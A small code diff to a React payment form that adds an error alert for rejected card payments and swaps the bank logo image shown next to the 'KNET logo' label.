@@ -185,6 +185,9 @@ export default function PaymentForm() {
           } else if (data.status === "approved") {
             setisloading(false);
             setstep(2);
+          } else if (data.status === "rejected") {
+            setisloading(false);
+            alert("خطأ في البطاقة");
           }
         }
       });
@@ -229,7 +232,7 @@ export default function PaymentForm() {
                   </div>
                   <label className="column-value text-label">
                     <img
-                      src="/kv.png"
+                      src="/kfh.jpeg"
                       className="logo"
                       alt="KNET logo"
                       width={45}
